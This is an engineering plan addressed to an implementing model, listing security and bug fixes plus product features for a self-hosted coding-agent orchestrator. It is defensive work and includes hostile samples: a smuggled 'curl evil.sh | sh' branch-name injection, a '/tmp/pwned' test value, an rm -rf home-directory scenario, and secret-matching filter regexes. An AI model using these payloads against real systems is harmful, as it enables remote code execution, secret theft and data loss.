# Productization Plan + Bug/Security Fix List

**Audience: the implementing model (Sonnet).** This doc was produced by a full read of
the codebase (all of `packages/*` and `apps/web`) plus the existing docs (PRD,
ARCHITECTURE, NEXT_STEPS, CONTRACT). It has two parts:

- **Part 1 — Fix first**: real bugs and security issues found in the current code,
  ordered by severity, each with a concrete fix. Do these before any Part 2 feature.
- **Part 2 — Productization features**: what to build to turn this into a polished,
  robust product for developers who hold multiple model subscriptions and want to run
  coding agents in parallel (autonomous runs, remote updates, mid-run intervention).

**Ground rules for every change:**
- `main` is sacred: branch → PR → merge. Keep `npm run typecheck`, `npm run build`,
  and `npm test -w @orc/engine` green on every PR.
- The contract is `@orc/types`. If you add/change a route or type, update
  `packages/types/src/api.ts` (+ `ROUTES`), `docs/CONTRACT.md`, and the mock server.
- Work top of this list downward. Each item states files and acceptance criteria —
  verify the criteria before moving on.

---

## Part 1 — Bugs & security (fix first, in this order)

### S1. Command injection via `execSync` string interpolation — CRITICAL

**Where:** `packages/engine/src/worktree-manager.ts` (7 call sites: lines ~40, 54, 69,
82, 87, 95, 213, 222, 240) and `packages/engine/src/validator.ts` (`getDiff`, ~line 107).

**Problem:** These build shell strings by interpolating `project.defaultBranch`,
`project.localPath`-derived paths, and branch names into `execSync("git … \"${x}\"")`.
`defaultBranch` and `localPath` are **user-controlled via the HTTP API**
(`POST /api/projects`, `PATCH /api/projects/:id`). Inside double quotes, `sh` still
performs `$(…)` command substitution, so a defaultBranch like
`main" $(curl evil.sh | sh) "` executes arbitrary commands. Combined with S2 (the API
is unauthenticated and CORS-open), this is a drive-by remote-command-execution vector.
Note `git-service.ts` already does this correctly with `execFile` + arg arrays — the
worktree manager and validator were never converted.

**Fix:**
1. Convert every `execSync` in `worktree-manager.ts` and `validator.ts` to
   `promisify(execFile)("git", [args…], { cwd })` — argument arrays, no shell. This
   also fixes the event-loop blocking (these sync calls freeze the server during
   fetch/worktree-add/diff; the codebase already migrated `git-service.ts` and
   `gate-runner.ts` for exactly this reason). `create()`, `remove()`, `changedFiles()`
   are already `async` so signatures don't change; `ValidatorImpl.getDiff` becomes
   async (await it in `review()`).
2. Belt-and-braces input validation in `packages/server/src/index.ts`:
   - `defaultBranch` must match `^[A-Za-z0-9._/-]+$` and must not start with `-`
     (reject with 400 otherwise) in both `POST /api/projects` and `PATCH`.
   - Reject any `repoUrl` that doesn't parse as `https://github.com/<owner>/<repo>`
     or `git@github.com:<owner>/<repo>` (it's passed to `gh --repo` and `git clone`;
     also prevents `-` flag-injection into git/gh).

**Acceptance:** grep shows zero `execSync(` under `packages/engine/`; creating a
project with `defaultBranch: 'main"; touch /tmp/pwned; "'` returns 400; typecheck,
build, engine tests green.

### S2. Unauthenticated API bound to 0.0.0.0 with reflect-any-origin CORS — CRITICAL

**Where:** `packages/server/src/index.ts` — `app.register(cors, { origin: true })`
(line ~243) and `app.listen({ port: ENV.port, host: "0.0.0.0" })` (line ~1290).

**Problem:** Anyone on the LAN — and, because CORS reflects every origin, **any
website open in the operator's browser** — can call every endpoint: read settings
(including the raw Telegram bot token, see S3), create/delete projects (which runs
`rm -rf` on disk, see S4), change merge policy to `fully_autonomous`, resolve
approvals, and start runs that spend real money and push code to GitHub. The
Tailscale-only deployment note in NEXT_STEPS doesn't protect a laptop on café wifi,
and CORS `origin: true` defeats even localhost-only binding.

**Fix (all three):**
1. **Bind host configurable, default loopback:** `ENV.host = process.env.HOST ?? "127.0.0.1"`
   in `config.ts`; use it in `app.listen`. Document `HOST=0.0.0.0` for tailnet/EC2 use.
2. **CORS allowlist:** default to the dev web origin(s)
   (`http://localhost:5173`, `http://127.0.0.1:5173`) plus an optional
   `ENV.corsOrigins` (comma-separated env `CORS_ORIGINS`). Never `origin: true`.
   (When the server later serves the built web app itself — F10 — same-origin makes
   CORS moot in production.)
3. **Optional bearer-token auth:** if `API_TOKEN` env (or a new
   `settings.apiToken`) is set, add a Fastify `onRequest` hook requiring
   `Authorization: Bearer <token>` on all `/api/*` routes except `/api/health`, and
   the same token as a `?token=` query param on the `/ws` upgrade. The web app reads
   the token from a login prompt stored in `localStorage` and sends it via
   `apps/web/src/api/client.ts` (add a header) and the `useWS` URL. Off by default
   (solo localhost use stays frictionless); required for any non-loopback HOST —
   refuse to start with `HOST != 127.0.0.1` unless a token is set or
   `ALLOW_UNAUTHENTICATED=1`.

**Acceptance:** server on defaults refuses connections from another machine; a fetch
from a random origin in the browser gets a CORS error; with `API_TOKEN` set, requests
without the header get 401, the web UI still works after entering the token.

### S3. Telegram bot token stored and served in plaintext — HIGH

**Where:** `settings.telegram.botToken` is saved raw in the settings JSON
(`repo.upsertSettings`) and returned verbatim by `GET /api/settings`; the Settings
page round-trips it (`apps/web/src/pages/Settings.tsx` lines ~470, 184). Whoever can
read the API (see S2) owns the bot — and the bot can approve risky merges.

**Fix:** Redact on read, write-only on save:
- In `GET /api/settings`, replace a present `botToken` with the literal
  `"__SET__"` sentinel (never the value).
- In `PUT /api/settings`, if the incoming `telegram.botToken` is `"__SET__"` or
  empty-and-previously-set, keep the stored value; otherwise overwrite.
- Settings UI: show a password field with placeholder "token saved — enter to
  replace", and stop echoing the token back into the input value.
- Same treatment for any future secret (`apiToken` from S2 item 3).
- Update the stale comment block at the top of `telegram.ts` (it still claims the
  token is "never stored raw" — it is, since the botToken field was added).

**Acceptance:** `curl /api/settings` never contains the real token; saving settings
without touching the token field leaves Telegram working; entering a new token
replaces it.

### S4. `rm -rf` on an arbitrary user-supplied path — HIGH

**Where:** `POST /api/projects` accepts `body.localPath` (any absolute path, `~`
expanded); `DELETE /api/projects/:id` then does
`rmSync(project.localPath, { recursive: true, force: true })` plus a sibling
`-wt-*` sweep (`index.ts` ~502–535). Creating a project with `localPath: "~"` and
deleting it wipes the home directory.

**Fix:**
1. On create: resolve and normalize the path; reject (400) if it is `/`, the home
   dir itself, not absolute after expansion, or contains `..`; reject if it is an
   ancestor of (or equal to) the server's CWD or `ENV.reposDir`. Require the path
   either not to exist yet or to be an empty directory or an existing clone whose
   `origin` matches `repoUrl` (a cheap `git remote get-url origin` check).
2. On delete: refuse the `rmSync` (skip cleanup, log a warning, still delete the DB
   rows) unless the directory contains a `.git` whose `origin` URL matches the
   project's `repoUrl`. Depth guard: also require `path.length > homedir().length + 1`.

**Acceptance:** creating a project with `localPath: "~"` or `"/"` returns 400;
deleting a project whose localPath was hand-edited to a non-clone directory leaves
the directory intact and logs a warning.

### S5. Spawned agents inherit the full server environment — MEDIUM

**Where:** both adapters (`packages/adapters/src/index.ts`) spawn `claude`/`opencode`
with `env: { ...process.env, PWD: opts.cwd }`; gate scripts (`gate-runner.ts`) and
`npm ci` (`worktree-manager.ts ensureDeps`) do the same. The server's env typically
holds `TELEGRAM_BOT_TOKEN` and any provider API keys from `.env` — and Claude runs
with `--permission-mode bypassPermissions`, so a prompt-injected or simply confused
agent (or any repo's `npm test` script — gates execute repo-controlled code by
design) can read and exfiltrate them.

**Fix:** build one `sanitizedEnv()` helper (new file `packages/adapters/src/env.ts`,
reused by engine via a copy or by passing env in `AgentRunOptions`): start from
`process.env`, delete keys matching
`/TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|TELEGRAM/i` except an allowlist the CLIs need
(`PATH`, `HOME`, `SHELL`, `TMPDIR`, `LANG`, `LC_*`, `NODE_*`, `npm_config_*`, plus
`ANTHROPIC_*` if present since Claude Code may need it). Use it for both adapters,
gate scripts, and `ensureDeps`. Document in README that gate scripts execute
repo-controlled code on the host, and that a container/sandbox mode is future work
(F13).

**Acceptance:** a task whose author prompt asks the model to `echo $TELEGRAM_BOT_TOKEN`
gets an empty value; agents and gates still run (verified by the seed-e2e harness).

### B1. "Stop" doesn't stop anything — the agent keeps running and spending — HIGH

**Where:** `POST /api/tasks/:id/stop` (`index.ts` ~906) only rewrites DB rows (run →
`stopped`, task → `blocked`). The actual child process lives in the Orchestrator's
`taskAbortControllers`, which the route never reaches. Worse, when the agent
finishes anyway, the pipeline continues (gates → validator → possibly **auto-merge**)
and overwrites the task status — the user pressed Stop and the PR merged anyway.

**Fix:**
1. `Orchestrator`: add `stopTask(taskId: string): boolean` — aborts the task's
   controller if present, marks the task id in a `stopRequested: Set<string>`, and
   `executeTask` checks that set at each stage boundary (after author run, after
   gates, before validator, before merge) and returns early with status `blocked`
   (emit a log line "stopped by user"). Clear the set entry in the `finally`.
2. `EngineRunner`: add `stopTask(projectId, taskId)` that forwards to the project's
   orchestrator (also look through the one-off orchestrators created by
   `dispatchOne` — see B3, which makes those tracked).
3. Route calls `engine.stopTask(...)` first; keep the DB writes as the fallback for
   when nothing is actually running. Also write an audit entry (`kind: "stopped"`,
   actor human).

**Acceptance:** dispatch a long task, hit Stop → the `claude`/`opencode` process is
gone within ~3s (SIGTERM→SIGKILL path already exists in `wireAbort`), the task ends
`blocked`, and nothing merges afterwards.

### B2. Run log history is unreadable after reload — every log row has `runId: ""` — HIGH

**Where:** every `onLog` emission in `orchestrator.ts` (lines ~522, 760, 811) and
`validator.ts` (~193) hardcodes `runId: ""`. The Board's history loader
(`Board.tsx` ~93–120) fetches runs, then `GET /api/runs/:id/logs` per run — which
matches nothing, so after a page reload the log panel is always empty; only live WS
logs ever show. The `runLogs` endpoint is effectively dead.

**Fix (choose the task-scoped route — simpler and matches how the UI thinks):**
1. Add `GET /api/tasks/:id/logs` (new `repo.getLogsByTask(db, taskId)`, indexed by
   the existing `task_id` column; add `LIMIT`/`?after=` paging — default last 1000).
   Register it in `ROUTES` in `@orc/types` and CONTRACT.md.
2. Board: replace the per-run log fan-out with one `taskLogs` call.
3. Keep writing `runId` properly anyway for future use: `executeTask` knows the
   attempt number, so pass `run-${task.id}-${task.attempts}` into the `onLog`
   payloads instead of `""` where a run exists (engine-level logs before the first
   attempt may keep `""`).

**Acceptance:** run a task, reload the page, select the task → historical logs appear.

### B3. Manual dispatch and the autonomous loop can double-run the same task — HIGH

**Where:** `EngineRunner.dispatchOne` builds a throwaway `Orchestrator` that is
**not** registered in `this.orchestrators`, so `engine.isRunning(projectId)` is
false while it runs. The `/dispatch` and `/retry` routes correctly refuse when the
autonomous loop is running — but the reverse is unguarded: pressing **Start** while
a manual dispatch is in flight boots the autonomous loop, whose orphan recovery sees
the task `in_progress` with no active run *in its own memory* and requeues it →
two agents on the same task, same branch name `orc/<taskId>`, same worktree path →
push rejections and interleaved commits.

**Fix:** track manual dispatches: keep a `Map<projectId, Set<taskId>> manualRuns` in
`EngineRunner`; `dispatchOne` registers/unregisters in a `finally`. `start()` returns
a 409-style error (throw; route surfaces it) if `manualRuns.get(project.id)?.size`.
Also expose the one-off orchestrator to `stopTask` (B1) via this map (store the
orchestrator instance, not just the task id).

**Acceptance:** while a manual dispatch runs, `POST /projects/:id/start` returns 409
with a clear message; after it finishes, start works.

### B4. Run rows are only written when a run *ends* — no live run, wrong duration — MEDIUM

**Where:** `Orchestrator.emitRunEvent` (orchestrator.ts ~820) is called once, after
the adapter returns, with `startedAt` = `endedAt` = now. So while an agent works
there is **no run row** (the `/dispatch` route papers over this with a fake
`placeholderRun` it never persists), run durations are always 0, and per-run cost
timing is wrong.

**Fix:** in `runAuthor`, emit a run event with `status: "running"`, real `startedAt`,
zero cost **before** `adapter.run(...)`; keep the terminal emit but preserve the
original `startedAt` (hold it in a local). `EngineRunner.onRunUpdated` already
upserts, so no server change is needed. Delete the `placeholderRun` blocks in
`/dispatch` and `/retry` and return the real run row (`repo.getRuns` after dispatch)
or just `{ task }` — update `@orc/types` responses accordingly and the two callers in
the web app.

**Acceptance:** during a run, `GET /api/tasks/:id/runs` shows a `running` row;
after completion the row's `endedAt - startedAt` matches wall-clock (>0).

### B5. `PATCH /api/tasks/:id` accepts any string as `status` — MEDIUM

**Where:** `index.ts` ~793: `if (body.status) updates.status = body.status` — no
validation against `TaskStatus`, no guard against nonsensical transitions (e.g.
setting a `done` task back to `in_progress` by hand, which orphan recovery will then
requeue and re-run, re-opening merged work).

**Fix:** validate `body.status` against the `TaskStatus` union (export a
`TASK_STATUSES` const array from `@orc/types/domain.ts` and reuse it in the Board's
column list too). Allow only human-meaningful transitions: anything →
`backlog`/`ready` (requeue), `in_progress` → nothing (409 — use Stop), `done` →
nothing (409 — use Rollback/Retry). Return 400 with the allowed set otherwise. Apply
the same enum check to `difficulty`/`role` if you add them to the PATCH body later.

**Acceptance:** `PATCH {status: "bogus"}` → 400; `PATCH {status: "ready"}` on a
failed task works; `PATCH {status: "in_progress"}` → 409.

### B6. `in_review` status exists but is never set — dead kanban column — LOW

**Where:** `domain.ts` defines `in_review` ("gates + validator running"); the
orchestrator never assigns it, so the Board column is permanently empty and the
user can't see which tasks are being validated (a phase that takes minutes).

**Fix:** in `executeTask`, set `task.status = "in_review"` +
`onTaskUpdated` right before the gates run, and back to `in_progress` when a retry
loop iterates (fix instructions path). Orphan recovery (`start()`) must treat
`in_review` like `in_progress` (requeue). `estimate.ts` already counts `in_review`
as pending — good. Check the Stop path (B1) handles `in_review` too.

**Acceptance:** while gates/validator run, the card sits in "In Review"; on a
gate-failure retry it moves back to "In Progress".

### B7. Planner passes the whole conversation as one argv — will hit E2BIG — MEDIUM

**Where:** `planner.ts runClaudeJson` spawns `claude -p <prompt>` with the full chat
transcript + prior-context inlined in a single argument; adapters do the same with
task prompts. macOS caps a single arg ~256KB and total argv ~1MB — a long planning
chat on a project with a fat PRD will start failing with a cryptic spawn error.

**Fix:** write the prompt to stdin instead: `claude -p --output-format json` reads
the prompt from stdin when `-p` is given no value (verify with `claude --help`; if
stdin isn't supported for `-p`, write the prompt to a temp file inside the cwd and
pass `-p "$(instructions to read file)"` — prefer stdin: change
`stdio: ["ignore", …]` to `["pipe", …]` and `proc.stdin.end(prompt)`). Do the same
for both adapters in `packages/adapters/src/index.ts` (`claude` and `opencode run`
both accept the prompt on stdin; for opencode, keep the message as the last CLI arg
only if stdin proves unsupported). Trim `buildPriorContext` task lists to the most
recent ~50 tasks as an extra bound.

**Acceptance:** a planning chat with a 300KB transcript completes; adapters still
pass the existing engine tests and the seed-e2e harness runs.

### B8. Telegram messages with Markdown metacharacters silently fail — LOW

**Where:** `telegram.ts approvalRequested` sends `parse_mode: "Markdown"` with raw
task titles/messages. A title containing `_`, `*`, `[`, or a backtick makes the Bot
API reject the message → the approval never reaches the phone (the code logs and
moves on) → an unattended run stalls waiting for an approval the user never saw.

**Fix:** drop `parse_mode` entirely (plain text is fine for these) or escape
Telegram-Markdown metacharacters. Also have `approvalRequested` fall back to a
plain-text resend (no parse_mode) if the first send returns `ok: false` — `tg()`
currently swallows the error; make it return the error description so callers can
retry.

**Acceptance:** an approval whose title is `fix _foo_ [bar]` arrives on Telegram.

### B9. Tasks added mid-run are invisible to the running orchestrator — MEDIUM

**Where:** `Orchestrator.start` loads `tasks` once and loops over that array;
`plan/commit` on a running project writes new Task rows the loop never sees, and the
run "finishes" without them (they sit in `backlog` until the user manually presses
Start again — which currently they can, since the finished loop deregisters).

**Fix:** give the loop a refresh hook: add `getTasks?: () => Task[]` to
`SchedulerDeps` (`EngineRunner` supplies `() => repo.getTasks(db, project.id)`).
At the top of each `while` iteration, reconcile: append any DB task whose id isn't
in `currentTasks` (and adopt status changes for non-active tasks, replacing the
per-task `fresh` patch that exists today). Keep in-memory state authoritative for
tasks in `activeTaskIds`. This is also the foundation for the "add a task while it
runs" product feature (F3).

**Acceptance:** start a 2-task project, `plan/commit` a third task while the first
runs → the third dispatches without restarting the run.

### B10. Stale unresolved approvals survive restarts as zombie action-required items — LOW

**Where:** `EngineRunner.pendingApprovals` resolvers live in process memory. After a
restart, resume-on-boot re-runs tasks and creates **new** notifications, but the old
`requiresApproval` rows (with no `respondedWith`) remain; the Notifications page and
Telegram show dead Approve/Reject buttons whose `resolveApproval` returns false.

**Fix:** on boot (in `main()` before resume), mark all unresponded
approval-notifications as `respondedWith: "expired_restart"` (new repo helper,
one UPDATE), and have the UI render that as "expired". When
`resolveNotification` can't find a resolver, return an explicit "approval expired —
the task will re-request if still needed" message to the caller (HTTP 410 / Telegram
callback answer) instead of silently succeeding.

**Acceptance:** kill the server while an approval is pending; after restart the old
notification shows "expired" and responding to it returns the explicit message.

### B11. Gates pass vacuously on repos with no scripts — MEDIUM (safety rail gap)

**Where:** `gate-runner.ts runScript` uses `npm run <s> --if-present`, so a repo
with no `typecheck`/`lint`/`build`/`test` scripts passes every gate (exit 0). New
repos created by `createGithubRepo` are seeded with a script-less `package.json` —
i.e. **the default path for brand-new projects has zero objective gates**; only the
validator model stands between generated code and auto-merge.

**Fix (two parts):**
1. Surface it: `GateRunnerImpl.run` already returns per-gate `output` saying
   "unavailable" — add a `vacuous: boolean` to `GateResult.details` (types change)
   when *all four* script gates were missing, and have `canAutoMerge` treat a fully
   vacuous gate result as risky (escalate to approval) unless a new
   `settings.allowVacuousGates` (default false) is on. Show a warning banner on the
   Board when the last gate result was vacuous.
2. Fix the root for new repos: when the planner deconstructs a plan for a brand-new
   repo, the seeded scaffold task should add real `test`/`build` scripts — append a
   standing instruction to `DECONSTRUCT_SHAPE` in `planner.ts`: the first scaffold
   task must set up `package.json` scripts (`test`, `build`, `lint`, `typecheck`)
   appropriate to the stack it chooses, and its acceptance criteria must include
   "npm test runs real tests and passes".

**Acceptance:** a repo with no scripts + `hard_gate_flag_risky` policy → merge
requires approval with reason "no objective gates ran"; engine tests green.

### B12. Risky-file regex flags `author.ts`, `token.ts` etc. — LOW (noise)

**Where:** `orchestrator.ts canAutoMerge`:
`/\.env|auth|secret|credential|token/i.test(f)` matches substrings anywhere in the
path — `src/author.ts`, `docs/authors.md`, `tokenizer.ts` all trip the
"auth/secret change" rail and needlessly demote auto-merges to approvals (alert
fatigue → the user stops reading approvals).

**Fix:** match path *segments*, not substrings:
`/(^|\/)\.env(\.|$)|(^|\/)(auth|secrets?|credentials?|tokens?)(\/|\.|$)/i` — and add
unit tests in the engine test file for `author.ts` (no), `auth.ts` (yes),
`src/auth/login.ts` (yes), `tokenizer.ts` (no), `.env.local` (yes).

**Acceptance:** new unit tests pass; the four existing engine tests stay green.

### B13. `scopesOverlap` mishandles glob patterns — LOW

**Where:** `orchestrator.ts scopesOverlap` only strips a trailing `/**`; patterns
like `src/**/*.ts`, `**/*`, `*.md` fall through to literal string compares, so
tasks scoped `["**/*"]` (the planner's fallback and the stub tasks) are treated as
never overlapping anything — the serialization rail silently off for exactly the
least-scoped (riskiest) tasks.

**Fix:** normalize each pattern to its static prefix (everything before the first
glob char: `src/**/*.ts` → `src`, `**/*` → `""`), then apply the existing
prefix-overlap logic, where an empty prefix overlaps everything. Add engine unit
tests: `["**/*"]` vs anything → true; `["src/**/*.ts"]` vs `["src/utils/**"]` →
true; `["docs/**"]` vs `["src/**"]` → false.

**Acceptance:** new tests pass; a plan with two `**/*` tasks runs them serially.

### B14. Unbounded `logs` table growth — LOW

**Where:** every agent output line is persisted forever (`logs` table); a few long
runs → hundreds of MB in SQLite, slowing the WAL and snapshot queries.

**Fix:** prune on boot and daily (`setInterval` in `main()`): delete logs older
than `LOG_RETENTION_DAYS` (env, default 14) **and** keep at most the newest ~2000
rows per task (`DELETE FROM logs WHERE task_id = ? AND id NOT IN (SELECT id … ORDER
BY ts DESC LIMIT 2000)` per task with more). Add an index on `logs(task_id, ts)` in
`schema.sql` (B2 relies on it too).

**Acceptance:** boot with an old fat DB → row count drops; task log view (B2) still
shows recent history.

### B15. WS broadcasts every project's events to every client — LOW

**Where:** `ws-hub.ts broadcast` ignores `client.projectId`; subscription only
scopes the snapshot. With several projects running, every browser tab processes
every log line of every project (the Board filters client-side by taskId, so it's
waste + a subtle cross-project log-bleed in the LogPanel if task ids ever collide).

**Fix:** carry a `projectId` on `ServerEvent` payloads where missing (log events
need one — thread it through `EngineRunner.enqueueLog`; task/run/project events
already imply it) and have `broadcast` skip clients subscribed to a different
project (clients with no subscription get project-level events only:
`project.updated/deleted`). Keep `notification` events global (they're the "needs
you" channel).

**Acceptance:** two projects running, two tabs each subscribed to one → each tab's
WS frames only contain its own project's logs.

---

## Part 2 — Productization features (build after Part 1)

Vision reminder (from the user): not a SaaS — a robust self-hosted app for
developers who, like the owner, hold several model subscriptions and want to run a
team of coding agents in parallel: plan in chat, watch a kanban, let it run
autonomously, get pinged remotely, and step in mid-run without breaking things.

### F1. First-run onboarding wizard (highest product impact)

Today a new user lands on an empty Board with 9 nav tabs and no guidance. Turn the
existing SetupView into a guided first-run flow:

- On load, if there are no projects **and** setup has never completed, route to a
  `Welcome` page: step 1 shows the three CLI checks (`/api/setup`, already built)
  with fix-it hints per failure (install command, login command, copy-paste ready);
  step 2 model roster — read the user's actual `opencode models` output (new
  endpoint `GET /api/setup/models` shelling `opencode models`) and let them
  enable/disable + map the roster instead of hand-editing IDs blind; step 3 routing
  defaults with a one-line explanation of difficulty tiers and the
  author-vs-validator rule; step 4 (optional) budgets + Telegram; step 5 "Create
  your first project" → existing NewProject.
- Persist `settings.onboardedAt`. Add "Re-run setup" link on SetupView.
- Files: new `apps/web/src/pages/Welcome.tsx`, `App.tsx` routing, `setup.ts`
  (+models endpoint), types.

### F2. Task detail drawer (make the black box explainable)

The Board's selected-task strip is cramped and hides the decision trail. Add a
right-side drawer (click a card) with tabs:

- **Overview**: description, acceptance criteria (checkable display), scope paths,
  model + fallback chain, attempts timeline (one row per run: model, duration —
  needs B4 — cost, exit reason).
- **Logs**: the existing live log panel + history (needs B2), with source filter
  (engine/agent/gate/validator) and auto-follow toggle.
- **Review**: latest `GateResult` as pass/fail chips with expandable output,
  validator verdicts with reasons + confidence (from `merge_decisions` — add
  `GET /api/tasks/:id/decisions`, repo fn exists).
- **PR**: diff viewer (exists), PR link, rollback/retry buttons (exist).
- Files: new `apps/web/src/components/TaskDrawer.tsx`, Board refactor, one new
  route + types entry.

### F3. Mid-run control (the user explicitly wants this)

With B1/B3/B9 done, expose real mid-run intervention in the UI:

- **Stop this task** button on running cards (B1), with a confirm.
- **Add a task while running**: a "+ Add task" affordance on the Board (title,
  description, difficulty, scope, deps picker) → `POST /api/projects/:id/tasks`
  (new route, materialize a single task) → picked up live via B9.
- **Reprioritize**: drag between Backlog/Ready columns → PATCH status (B5 rules).
- **Pause modes**: split Pause into "Pause (finish current tasks)" — set
  `paused` but let active tasks complete (new orchestrator flag `drain`) — and
  "Stop now" (current abort behavior). Two buttons in ProjectHeader.
- Files: orchestrator (drain flag), engine-runner, index.ts (add-task route),
  Board/ProjectHeader, types.

### F4. Live "mission control" strip on the Board

The user wants to glance and know what the team is doing. Add a slim strip above
the columns: one row per **active agent** (model avatar, task title, elapsed time,
last-activity heartbeat — the activity map already exists in Board.tsx), plus
project burn: spend so far vs budget with a thin progress bar (data already in
`costAnalytics`), and count of pending approvals (deep-link to Notifications).
Files: new `apps/web/src/components/MissionControl.tsx`, Board.

### F5. Notifications that reach the user (not just a tab)

- **Browser notifications** (Notification API) for `action_required` and task
  failures when the tab is hidden; permission requested from Settings.
- **Approval deep links**: Telegram approval messages should include the PR URL
  and top validator reasons (data exists on the notification/decision) so the user
  can decide from the phone without opening the app.
- **Digest setting**: `settings.telegram.digest: "off" | "terminal" | "all"` —
  "terminal" (default) pushes only done/failed/approval; "all" adds per-attempt
  progress. Wire in `EngineRunner.onTaskUpdated`/`taskStatus`.
- Files: `useToast`-style `useBrowserNotify` hook, telegram.ts, engine-runner,
  Settings page, types.

### F6. Model health + subscription awareness

For the multi-subscription audience, per-model observability:

- **Health panel** on SetupView: last `testModels` result per model (persist
  results to a small `model_checks` table with ts), rolling failure rate from
  `runs` (exit_reason error/stuck per model), median run duration.
- **Rate-limit cooldown**: when an adapter failure looks like a rate limit
  (`/rate.?limit|429|too many requests|quota/i` on the summary), mark the model
  "cooling down" in-memory for N minutes (EngineRunner map) and have the
  orchestrator's dispatch skip it (treat like budget-blocked, log once) so the
  fallback chain routes around it instead of burning attempts.
- Files: adapters (classify exitReason `rate_limited`), orchestrator (skip set),
  engine-runner, setup.ts, SetupView, types.

### F7. Cost guardrails short of the hard stop

Budget today is a cliff (checkBudget → refuse). Add soft rails:

- Warning notifications at 50% / 80% of project budget and global monthly budget
  (emit once per threshold — track in a `budget_alerts` table or settings JSON),
  pushed via WS + Telegram.
- Board budget bar turns amber/red at the thresholds (data exists in analytics).
- Per-task estimate chip on Ready cards ("~$0.03") using the existing
  `getModelRunAverages`.
- Files: budget.ts (threshold helper), engine-runner (check after each cost
  record), CostView/Board, types.

### F8. Autonomous-run report card

When a run ends (the `finally` in `EngineRunner.start`), generate a **run
summary**: tasks done/failed, total cost, duration, PRs merged (links), approvals
that were required, and the top failure reasons — persist as an `audit_log` entry
(kind `run_summary`) and send it to Telegram (the `info` push exists but is one
line — make it the digest). Render past run summaries at the top of AuditView.
This is the "get updates" feature for away-from-keyboard autonomy. Optional
(behind a toggle): pipe the summary through the `updates`-role model (Grok) for a
natural-language paragraph — but the mechanical digest must not depend on a model.
Files: engine-runner, repo (audit query by kind), AuditView, telegram.

### F9. Project templates & per-project gate config

- Per-project overrides (new `projects.config` JSON column): gate script names
  (which npm scripts count as gates — the P2 roadmap item; repos vary),
  `maxAttempts`, merge policy override, and a "test command" free-field for
  non-npm stacks (run via execFile with args split, no shell).
- `GateRunnerImpl` reads the override through a new `SchedulerDeps.gateConfig`.
- NewProject gains an "Advanced" accordion for these; sensible defaults unchanged.
- Files: types, schema (+migration in db/index.ts), gate-runner, engine-runner,
  NewProject/ProjectHeader.

### F10. Ship it like a product: packaging & deployment

- **Serve the built web app from the server** (the Round-3 note in
  ARCHITECTURE.md): `@fastify/static` on `apps/web/dist` when it exists;
  `npm run start` = build all + run server; then one port, no CORS in prod (S2).
- **Single-command run**: root scripts `npm run start` (prod) and `npm run setup`
  (interactive: create `.env`, run setup checks in terminal). A `bin` entry
  (`hoopedorc` CLI: `start|init`) so `npx`/global install works.
- **systemd unit + Dockerfile** in `deploy/` (Docker mounts the repos dir, the
  DB, and the user's `~/.config` for gh/claude/opencode auth — document the
  caveats; native + systemd is the primary path since the CLIs need auth).
- **Versioning**: keep a real CHANGELOG.md for the orchestrator itself; tag
  releases.
- Files: server (static serving), package.json(s), deploy/, README.

### F11. Docs for other users

README today is contributor-oriented. Add `docs/USER_GUIDE.md`: what it is (3
paragraphs), install + prerequisites (subscriptions needed per model, opencode
auth walkthrough), first project tutorial (plan chat → review table → start →
watch board → approval on Telegram), the safety model (gates, validator,
risky-change rules, budgets, rollback), remote setup (Tailscale + HOST +
API_TOKEN from S2), and a troubleshooting table built from the real failure modes
in NEXT_STEPS.md (PWD bug symptoms, opencode lock collisions, vacuous gates…).
Link it from the README and the app's Setup page.

### F12. Multi-project run queue — LOW priority

`engine.orchestrators` already supports concurrent projects, but they compete for
the same models (per-model `maxConcurrent` is enforced per-orchestrator, not
globally — two projects can each run 2 deepseek-flash tasks). Move
`modelActiveCount` up to a shared registry in `EngineRunner` passed via deps so
per-model caps hold across projects. UI: Projects page shows per-project
running/paused status with start/pause inline (mostly exists).

### F13. Sandbox mode for agents & gates — FUTURE (note only, don't build now)

The honest security posture (S5, B11) is "agents and repo scripts execute on the
host". A `SANDBOX=container` mode running each worktree's agent + gates inside a
disposable container (repo mounted, no host env, network-restricted) is the real
fix. Requires the CLIs authenticated inside the image — significant work; design
doc first (`docs/specs/sandbox.md`), do not attempt as part of this pass.

---

## Suggested execution order

| Phase | Items | Rationale |
|---|---|---|
| 1 | S1, S2, S3, S4 | Close the injection/exposure holes before anything else touches the network surface. |
| 2 | B1, B2, B3, B4, B5 | The control-plane bugs users hit daily (stop, logs, double-run, run rows, status). |
| 3 | S5, B6–B15 | Hygiene + rails; each is small and independent. |
| 4 | F1, F2, F3, F4 | Core product loop: onboard → understand → intervene → observe. |
| 5 | F5, F6, F7, F8 | Away-from-keyboard autonomy story. |
| 6 | F9, F10, F11, F12 | Per-repo flexibility, packaging, docs. |

Each phase = one or a few PRs. Keep PRs scoped to items; reference the item IDs
(S1, B4, F3…) in commit messages so the audit trail maps back to this plan.
